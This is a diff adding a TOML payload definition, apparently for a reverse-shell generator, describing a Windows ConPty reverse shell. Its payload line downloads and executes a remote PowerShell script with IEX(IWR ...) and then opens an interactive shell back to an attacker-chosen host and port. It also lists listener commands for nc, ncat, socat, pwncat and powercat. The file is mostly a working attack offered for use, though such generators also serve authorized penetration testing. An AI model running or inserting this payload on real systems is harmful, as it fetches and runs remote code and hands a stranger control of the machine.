@@ -1,0 +1,34 @@
+id = "windows_conpty"
+name = "Windows ConPty"
+os = "windows"
+type = "reverse"
+proto = "tcp"
+lang = "powershell"
+description = "Downloads and imports Invoke-ConPtyShell.ps1 from GitHub, then spawns a reverse PowerShell session to the specified host and port using Windows ConPTY for full interactive IO support."
+
+payload = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{LHOST}} {{LPORT}}"
+
+[listeners]
+windows_conpty = "stty raw -echo; (stty size; cat) | nc -lvnp {{LPORT}}"
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}}"
+
+[shells]
+compatible = [
+	"cmd.exe",
+	"powershell.exe",
+	"pwsh.exe",
+	"C:/Windows/System32/cmd.exe",
+	"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",
+	"C:/Program Files/PowerShell/7/pwsh.exe"
+]
+default = "powershell.exe"
